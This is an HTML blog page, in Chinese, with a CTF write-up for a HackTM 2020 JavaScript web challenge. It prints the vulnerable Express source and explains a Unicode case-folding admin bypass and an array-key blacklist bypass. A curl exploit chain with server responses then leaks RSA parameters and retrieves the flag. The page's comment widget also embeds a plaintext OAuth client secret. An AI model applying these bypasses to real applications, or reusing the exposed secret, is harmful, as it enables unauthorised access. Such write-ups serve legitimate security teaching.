@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="syang">
+  <meta name="description" content="Life Is Like A Boat">
+  
+  
+  <link rel="prev" href="https://syang-ng.github.io/2020/02/cve-2019-11076-cribl-ui-unauthorized-commands-execution/" />
+  
+  <link rel="canonical" href="https://syang-ng.github.io/2020/02/some-tricks-about-javascript/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           HackTM 的一道题背后的 JavaScript Tricks | syang&#39;s blog
+       
+  </title>
+  <meta name="title" content="HackTM 的一道题背后的 JavaScript Tricks | syang&#39;s blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/syang-ng.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "HackTM 的一道题背后的 JavaScript Tricks",
+    "headline" : "HackTM 的一道题背后的 JavaScript Tricks",
+    "description" : "HackTM 遇到的一道 JavaScript 相关 CTF 考题，太久没接触相关领域以至于都快忘记相关的考点了，这里再特定总结一下。 题目分析 题目链接如下：http:\/\/167.17",
+    "inLanguage" : "zh-cn",
+    "author" : "syang",
+    "creator" : "syang",
+    "publisher": "syang",
+    "accountablePerson" : "syang",
+    "copyrightHolder" : "syang",
+    "copyrightYear" : "2020",
+    "datePublished": "2020-02-04 15:53:37 \x2b0800 CST",
+    "dateModified" : "2020-02-04 15:53:37 \x2b0800 CST",
+    "url" : "https:\/\/syang-ng.github.io\/2020\/02\/some-tricks-about-javascript\/",
+    "wordCount" : "1901",
+    "keywords" : [  "syang\x27s blog"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">HackTM 的一道题背后的 JavaScript Tricks</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://syang-ng.github.io" rel="author">syang</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2020-02-04 itemprop="datePublished">February 4, 2020</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://syang-ng.github.io/categories/ctf/"> CTF </a>
+                        
+                </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          
+
+<p>HackTM 遇到的一道 JavaScript 相关 CTF 考题，太久没接触相关领域以至于都快忘记相关的考点了，这里再特定总结一下。</p>
+
+<h2 id="题目分析">题目分析</h2>
+
+<p>题目链接如下：<a href="http://167.172.165.153:60000/" rel="nofollow noreferrer" target="_blank">http://167.172.165.153:60000/</a></p>
+
+<p>可以看到题目直接给出了相关源码：</p>
+
+<pre><code class="language-javascript">const express = require(&quot;express&quot;);
+const cors = require(&quot;cors&quot;);
+const app = express();
+const uuidv4 = require(&quot;uuid/v4&quot;);
+const md5 = require(&quot;md5&quot;);
+const jwt = require(&quot;express-jwt&quot;);
+const jsonwebtoken = require(&quot;jsonwebtoken&quot;);
+const server = require(&quot;http&quot;).createServer(app);
+const io = require(&quot;socket.io&quot;)(server);
+const bigInt = require(&quot;big-integer&quot;);
+const { flag, p, n, _clearPIN, jwtSecret } = require(&quot;./flag&quot;);
+
+const config = {
+  port: process.env.PORT || 8081,
+  width: 120,
+  height: 80,
+  usersOnline: 0,
+  message: &quot;Hello there!&quot;,
+  p: p,
+  n: n,
+  adminUsername: &quot;hacktm&quot;,
+  whitelist: [&quot;/&quot;, &quot;/login&quot;, &quot;/init&quot;],
+  backgroundColor: 0x888888,
+  version: Number.MIN_VALUE
+};
+
+io.sockets.on(&quot;connection&quot;, function(socket) {
+  config.usersOnline++;
+  socket.on(&quot;disconnect&quot;, function() {
+    config.usersOnline--;
+  });
+});
+
+let users = {
+  0: {
+    username: config.adminUsername,
+    rights: Object.keys(config)
+  }
+};
+
+let board = new Array(config.height)
+  .fill(0)
+  .map(() =&gt; new Array(config.width).fill(config.backgroundColor));
+let boardString = boardToStrings();
+
+app.use(express.json());
+app.use(cors());
+app.use(
+  jwt({ secret: jwtSecret }).unless({
+    path: config.whitelist
+  })
+);
+app.use(function(error, req, res, next) {
+  if (error.name === &quot;UnauthorizedError&quot;) {
+    res.json(err(&quot;Invalid token or not logged in.&quot;));
+  }
+});
+
+function sign(o) {
+  return jsonwebtoken.sign(o, jwtSecret);
+}
+
+function isAdmin(u) {
+  return u.username.toLowerCase() == config.adminUsername.toLowerCase();
+}
+
+function ok(data = {}) {
+  return { status: &quot;ok&quot;, data: data };
+}
+
+function err(msg = &quot;Something went wrong.&quot;) {
+  return { status: &quot;error&quot;, message: msg };
+}
+
+function onlyUnique(value, index, self) {
+  return self.indexOf(value) === index;
+}
+
+app.get(&quot;/&quot;, (req, res) =&gt; {
+  // Get current board
+  res.json(ok({ board: boardString }));
+});
+
+app.post(&quot;/init&quot;, (req, res) =&gt; {
+  // Initialize new round and sign admin token
+  // RSA protected!
+  // POST
+  // {
+  //   p:&quot;0&quot;,
+  //   q:&quot;0&quot;
+  // }
+
+  let { p = &quot;0&quot;, q = &quot;0&quot;, clearPIN } = req.body;
+
+  let target = md5(config.n.toString());
+
+  let pwHash = md5(
+    bigInt(String(p))
+      .multiply(String(q))
+      .toString()
+  );
+
+  if (pwHash == target &amp;&amp; clearPIN === _clearPIN) {
+    // Clear the board
+    board = new Array(config.height)
+      .fill(0)
+      .map(() =&gt; new Array(config.width).fill(config.backgroundColor));
+    boardString = boardToStrings();
+
+    io.emit(&quot;board&quot;, { board: boardString });
+  }
+
+  //Sign the admin ID
+  let adminId = pwHash
+    .split(&quot;&quot;)
+    .map((c, i) =&gt; c.charCodeAt(0) ^ target.charCodeAt(i))
+    .reduce((a, b) =&gt; a + b);
+
+  console.log(adminId);
+
+  res.json(ok({ token: sign({ id: adminId }) }));
+});
+
+app.get(&quot;/flag&quot;, (req, res) =&gt; {
+  // Get the flag
+  // Only for root
+  if (req.user.id == 0) {
+    res.send(ok({ flag: flag }));
+  } else {
+    res.send(err(&quot;Unauthorized&quot;));
+  }
+});
+
+app.get(&quot;/serverInfo&quot;, (req, res) =&gt; {
+  // Get server info
+  // Only for logged in users
+
+  let user = users[req.user.id] || { rights: [] };
+  let info = user.rights.map(i =&gt; ({ name: i, value: config[i] }));
+  res.json(ok({ info: info }));
+});
+
+app.post(&quot;/paint&quot;, (req, res) =&gt; {
+  // Paint on the canvas
+  // Only for logged in users
+  // POST
+  // {
+  //   x:0,
+  //   y:0
+  // }
+  let user = users[req.user.id] || {};
+
+  x = req.body.x;
+  y = req.body.y;
+
+  let color = user.color || 0x0;
+
+  if (board[y] &amp;&amp; board[y][x] &gt;= 0) {
+    board[y][x] = color;
+    boardString = boardToStrings();
+    io.emit(&quot;change&quot;, { change: { pos: [x, y], color: color } });
+    res.send(ok());
+  } else {
+    res.send(err(&quot;Invalid painting&quot;));
+  }
+});
+
+app.post(&quot;/updateUser&quot;, (req, res) =&gt; {
+  // Update user color and rights
+  // Only for admin
+  // POST
+  // {
+  //   color: 0xDEDBEE,
+  //   rights: [&quot;height&quot;, &quot;width&quot;, &quot;usersOnline&quot;]
+  // }
+  let uid = req.user.id;
+  let user = users[uid];
+  if (!user || !isAdmin(user)) {
+    res.json(err(&quot;You're not an admin!&quot;));
+    return;
+  }
+  let color = parseInt(req.body.color);
+  users[uid].color = (color || 0x0) &amp; 0xffffff;
+  let rights = req.body.rights || [];
+  if (rights.length &gt; 0 &amp;&amp; checkRights(rights)) {
+    users[uid].rights = user.rights.concat(rights).filter(onlyUnique);
+  }
+
+  res.json(ok({ user: users[uid] }));
+});
+
+app.post(&quot;/login&quot;, (req, res) =&gt; {
+  // Login
+  // POST
+  // {
+  //   username: &quot;dumbo&quot;,
+  // }
+
+  let u = {
+    username: req.body.username,
+    id: uuidv4(),
+    color: Math.random() &lt; 0.5 ? 0xffffff : 0x0,
+    rights: [
+      &quot;message&quot;,
+      &quot;height&quot;,
+      &quot;width&quot;,
+      &quot;version&quot;,
+      &quot;usersOnline&quot;,
+      &quot;adminUsername&quot;,
+      &quot;backgroundColor&quot;
+    ]
+  };
+
+  if (isValidUser(u)) {
+    users[u.id] = u;
+    res.send(ok({ token: sign({ id: u.id }) }));
+  } else {
+    res.json(err(&quot;Invalid creds&quot;));
+  }
+});
+
+function isValidUser(u) {
+  return (
+    u.username.length &gt;= 3 &amp;&amp;
+    u.username.toUpperCase() !== config.adminUsername.toUpperCase()
+  );
+}
+
+function boardToStrings() {
+  return board.map(b =&gt; b.join(&quot;,&quot;));
+}
+
+function checkRights(arr) {
+  let blacklist = [&quot;p&quot;, &quot;n&quot;, &quot;port&quot;];
+  
+  for (let i = 0; i &lt; arr.length; i++) {
+    const element = arr[i];
+    if (blacklist.includes(element)) {
+      return false;
+    }
+  }
+  return true;
+}
+
+server.listen(config.port, () =&gt;
+  console.log(`Server listening on port ${config.port}!`)
+);
+</code></pre>
+
+<p>首先是源码审计，很容易就能看到路由：</p>
+
+<pre><code class="language-javascript">app.get(&quot;/flag&quot;, (req, res) =&gt; {
+  // Get the flag
+  // Only for root
+  if (req.user.id == 0) {
+    res.send(ok({ flag: flag }));
+  } else {
+    res.send(err(&quot;Unauthorized&quot;));
+  }
+});
+</code></pre>
+
+<p>该路由要求用户 id 等于 0，结合到程序使用了 jwt，在无法伪造 jwt 的情况下，需要考虑如何获得 id 为 0 的用户的 jwt，此时观察到以下路由：</p>
+
+<pre><code class="language-javascript">app.post(&quot;/init&quot;, (req, res) =&gt; {
+  // Initialize new round and sign admin token
+  // RSA protected!
+  // POST
+  // {
+  //   p:&quot;0&quot;,
+  //   q:&quot;0&quot;
+  // }
+
+  let { p = &quot;0&quot;, q = &quot;0&quot;, clearPIN } = req.body;
+
+  let target = md5(config.n.toString());
+
+  let pwHash = md5(
+    bigInt(String(p))
+      .multiply(String(q))
+      .toString()
+  );
+
+  if (pwHash == target &amp;&amp; clearPIN === _clearPIN) {
+    // Clear the board
+    board = new Array(config.height)
+      .fill(0)
+      .map(() =&gt; new Array(config.width).fill(config.backgroundColor));
+    boardString = boardToStrings();
+
+    io.emit(&quot;board&quot;, { board: boardString });
+  }
+
+  //Sign the admin ID
+  let adminId = pwHash
+    .split(&quot;&quot;)
+    .map((c, i) =&gt; c.charCodeAt(0) ^ target.charCodeAt(i))
+    .reduce((a, b) =&gt; a + b);
+
+  console.log(adminId);
+
+  res.json(ok({ token: sign({ id: adminId }) }));
+});
+</code></pre>
+
+<p>很明显在 <code>n = p * q</code> 时，有 <code>adminId</code>  等于 0，此时能获得 id 为 0 的 token，因此下一步就是如何泄露程序的 p 和 n，这里观察到以下路由：</p>
+
+<pre><code class="language-javascript">app.get(&quot;/serverInfo&quot;, (req, res) =&gt; {
+  // Get server info
+  // Only for logged in users
+
+  let user = users[req.user.id] || { rights: [] };
+  let info = user.rights.map(i =&gt; ({ name: i, value: config[i] }));
+  res.json(ok({ info: info }));
+});
+</code></pre>
+
+<p>会将 <code>user.rights</code> 内的值作为 key 得到 config[key] 的值，而 p / n 恰好在 config 对象内，所以下一步就是如何给 <code>user.rights</code> 增加 p 和 n 这两个值，继续看下一个路由：</p>
+
+<pre><code class="language-javascript">app.post(&quot;/updateUser&quot;, (req, res) =&gt; {
+  // Update user color and rights
+  // Only for admin
+  // POST
+  // {
+  //   color: 0xDEDBEE,
+  //   rights: [&quot;height&quot;, &quot;width&quot;, &quot;usersOnline&quot;]
+  // }
+  let uid = req.user.id;
+  let user = users[uid];
+  if (!user || !isAdmin(user)) {
+    res.json(err(&quot;You're not an admin!&quot;));
+    return;
+  }
+  let color = parseInt(req.body.color);
+  users[uid].color = (color || 0x0) &amp; 0xffffff;
+  let rights = req.body.rights || [];
+  if (rights.length &gt; 0 &amp;&amp; checkRights(rights)) {
+    users[uid].rights = user.rights.concat(rights).filter(onlyUnique);
+  }
+
+  res.json(ok({ user: users[uid] }));
+});
+</code></pre>
+
+<p>很明显，只要满足 <code>!isAdmin(user)</code> 和 <code>checkRights(rights)</code> 两个函数即可。看两个函数的实现：</p>
+
+<pre><code class="language-javascript">function isAdmin(u) {
+  return u.username.toLowerCase() == config.adminUsername.toLowerCase();
+}
+
+function checkRights(arr) {
+  let blacklist = [&quot;p&quot;, &quot;n&quot;, &quot;port&quot;];
+  
+  for (let i = 0; i &lt; arr.length; i++) {
+    const element = arr[i];
+    if (blacklist.includes(element)) {
+      return false;
+    }
+  }
+  return true;
+}
+</code></pre>
+
+<p>结合注册用户时的检验函数：</p>
+
+<pre><code class="language-javascript">function isValidUser(u) {
+  return (
+    u.username.length &gt;= 3 &amp;&amp;
+    u.username.toUpperCase() !== config.adminUsername.toUpperCase()
+  );
+}
+</code></pre>
+
+<p>很明显本题的考点非常清楚：</p>
+
+<ol>
+<li>找到一个字符串 s 使其满足 <code>s.toUpperCase() !== config.adminUsername.toUpperCase()</code> 且 <code>s.toLowerCase() == config.adminUsername.toLowerCase()</code></li>
+<li>找到属性 key 使其满足 <code>[&quot;p&quot;, &quot;n&quot;, &quot;port&quot;].includes(key) === false</code> 而且 <code>config[key] === p</code></li>
+</ol>
+
+<p>下面直接贴 exp：</p>
+
+<h3 id="exp">exp</h3>
+
+<pre><code class="language-shell"># /login
+curl --location --request POST 'http://167.172.165.153:60001/login' \
+--header 'Content-Type: application/json' \
+--data-raw '{
+	&quot;username&quot;: &quot;hacKtm&quot;
+}'
+# {&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:{&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVmNDdlZTM2LTZjZTMtNGNmMS04OThiLWIwMGEwMGY2NTQ3NiIsImlhdCI6MTU4MDYxNzY3OH0.yzF9x5J7tbnjUWt-rXRd-WOKHXYTC1u9RFgcdv6DSEs&quot;}}
+
+# /updateUser
+curl --location --request POST 'http://167.172.165.153:60001/updateUser' \
+--header 'Content-Type: application/json' \
+--header 'Authorization:  Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVmNDdlZTM2LTZjZTMtNGNmMS04OThiLWIwMGEwMGY2NTQ3NiIsImlhdCI6MTU4MDYxNzY3OH0.yzF9x5J7tbnjUWt-rXRd-WOKHXYTC1u9RFgcdv6DSEs' \
+--data-raw '{
+	&quot;color&quot;: 123,
+	&quot;rights&quot;: [[&quot;n&quot;],[&quot;p&quot;]]
+}'
+# {&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:{&quot;user&quot;:{&quot;username&quot;:&quot;hacKtm&quot;,&quot;id&quot;:&quot;ef47ee36-6ce3-4cf1-898b-b00a00f65476&quot;,&quot;color&quot;:0,&quot;rights&quot;:[&quot;message&quot;,&quot;height&quot;,&quot;width&quot;,&quot;version&quot;,&quot;usersOnline&quot;,&quot;adminUsername&quot;,&quot;backgroundColor&quot;,[&quot;n&quot;],[&quot;p&quot;]]}}}
+
+# /serverInfo
+curl --location --request GET 'http://167.172.165.153:60001/serverInfo' \
+--header 'Content-Type: application/json' \
+--header 'Authorization:  Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVmNDdlZTM2LTZjZTMtNGNmMS04OThiLWIwMGEwMGY2NTQ3NiIsImlhdCI6MTU4MDYxNzY3OH0.yzF9x5J7tbnjUWt-rXRd-WOKHXYTC1u9RFgcdv6DSEs' 
+# &quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:{&quot;info&quot;:[{&quot;name&quot;:&quot;message&quot;,&quot;value&quot;:&quot;Hello there!&quot;},{&quot;name&quot;:&quot;height&quot;,&quot;value&quot;:80},{&quot;name&quot;:&quot;width&quot;,&quot;value&quot;:120},{&quot;name&quot;:&quot;version&quot;,&quot;value&quot;:5e-324},{&quot;name&quot;:&quot;usersOnline&quot;,&quot;value&quot;:17},{&quot;name&quot;:&quot;adminUsername&quot;,&quot;value&quot;:&quot;hacktm&quot;},{&quot;name&quot;:&quot;backgroundColor&quot;,&quot;value&quot;:8947848},{&quot;name&quot;:[&quot;n&quot;],&quot;value&quot;:&quot;54522055008424167489770171911371662849682639259766156337663049265694900400480408321973025639953930098928289957927653145186005490909474465708278368644555755759954980218598855330685396871675591372993059160202535839483866574203166175550802240701281743391938776325400114851893042788271007233783815911979&quot;},{&quot;name&quot;:[&quot;p&quot;],&quot;value&quot;:&quot;192342359675101460380863753759239746546129652637682939698853222883672421041617811211231308956107636139250667823711822950770991958880961536380231512617&quot;}]}}
+
+# /init
+curl --location --request POST 'http://167.172.165.153:60001/init' \
+--header 'Content-Type: application/json' \
+--header 'Authorization:  Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImVmNDdlZTM2LTZjZTMtNGNmMS04OThiLWIwMGEwMGY2NTQ3NiIsImlhdCI6MTU4MDYxNzY3OH0.yzF9x5J7tbnjUWt-rXRd-WOKHXYTC1u9RFgcdv6DSEs' \
+--data-raw '{
+	&quot;p&quot;: &quot;192342359675101460380863753759239746546129652637682939698853222883672421041617811211231308956107636139250667823711822950770991958880961536380231512617&quot;,
+	&quot;q&quot;: &quot;283463585975138667365296941492014484422030788964145259030277643596460860183630041214426435642097873422136064628904111949258895415157497887086501927987&quot;,
+	&quot;clearPIN&quot;: &quot;2333&quot;
+}'
+# {&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:{&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTgwNjE4ODgyfQ.rBRCrfHfhhv_hfgN9ZZedzRMOQQ8wj0zBXiqobX-B7Q&quot;}}
+
+# /flag
+curl --location --request GET 'http://167.172.165.153:60001/flag' \
+--header 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MCwiaWF0IjoxNTgwNjE4ODgyfQ.rBRCrfHfhhv_hfgN9ZZedzRMOQQ8wj0zBXiqobX-B7Q'
+# {&quot;status&quot;:&quot;ok&quot;,&quot;data&quot;:{&quot;flag&quot;:&quot;HackTM{Draw_m3_like_0ne_of_y0ur_japan3se_girls}&quot;}}
+</code></pre>
+
+<h2 id="javascript-tricks">JavaScript Tricks</h2>
+
+<h3 id="unicode">Unicode</h3>
+
+<p>看以下这段代码：</p>
+
+<pre><code class="language-javascript">for(let i = 0; i &lt; 0xffff; i++) {
+    let c = String.fromCharCode(i)
+    if(c.toLowerCase() == 'k' &amp;&amp; c.toUpperCase()!= 'K') {
+        console.log(i)
+    }
+}
+</code></pre>
+
+<p>正常情况下应该没有任何结果，但在 js 里，会得到一个很有意思的值 8490，对应的字符是 <code>K</code>，该字符并非大写字母 <code>K</code> ，而是拉丁字母，但对应的小写得到的是 <code>k</code>，这也算一个比较有意思的 JavaScript Trick，剩下的还有许多字母也有这种特性，这里就不再多讲了。</p>
+
+<h3 id="tostring">toString</h3>
+
+<p>观察以下代码：</p>
+
+<pre><code class="language-shell">$ node
+Welcome to Node.js v12.4.0.
+Type &quot;.help&quot; for more information.
+&gt; const array = ['n']
+undefined
+&gt; console.log(array)
+[ 'n' ]
+undefined
+&gt; array
+[ 'n' ]
+&gt; array + 'c'
+'nc'
+</code></pre>
+
+<p>这主要是因为 JavaScript 对 Array 对象的 <code>toString</code> 函数的默认实现是等价于 <code>array.join(',')</code>，返回由 <code>,</code> 拼接而成的字符串，而在访问 JavaScript 对象时，如果以数组作为键名，实际是以数组 <code>toString()</code> 函数的返回值作为键名，因此继续看以下代码：</p>
+
+<pre><code class="language-shell">&gt; let a = ['a']
+undefined
+&gt; let aa = ['a']
+undefined
+&gt; aa === a
+false
+&gt; let b = {}
+undefined
+&gt; b[a] = 'c'
+'c'
+&gt; b[a] === b[aa]
+true
+</code></pre>
+
+<p>不难理解，由于两个数组是不同的对象，因此 <code>a === aa</code> 返回的是 <code>false</code>；而二者 <code>toString()</code> 函数的返回值相同，因此在对象中二者实际是同一个键，<code>b[a] === b[aa]</code> 返回的是 <code>true</code>。</p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>syang </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://syang-ng.github.io/2020/02/some-tricks-about-javascript/>https://syang-ng.github.io/2020/02/some-tricks-about-javascript/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://syang-ng.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://syang-ng.github.io/2020/02/cve-2019-11076-cribl-ui-unauthorized-commands-execution/" class="prev" rel="prev" title="CVE 2019 11076 Cribl UI 1.5.0 未授权命令执行漏洞分析"><i class="iconfont icon-left"></i>&nbsp;CVE 2019 11076 Cribl UI 1.5.0 未授权命令执行漏洞分析</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+          
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+  const gitalk = new Gitalk({
+    clientID: '10b807dd4496d773d0b9',
+    clientSecret: 'c5fe75039eb62db59ca9181aa20ebb0a9a73a1fc',
+    repo: 'syang-ng.github.io',
+    owner: 'syang-ng',
+    admin: ['syang-ng'],
+    id: location.pathname, 
+    distractionFreeMode: false 
+  });
+  (function() {
+    if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+      document.getElementById('gitalk-container').innerHTML = 'Gitalk comments not available by default when the website is previewed locally.';
+      return;
+    }
+    gitalk.render('gitalk-container');
+  })();
+</script>
+
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2017 - 2020</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://syang-ng.github.io">syang</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+    <script src="/js/vendor_no_gallery.min.js" async=""></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
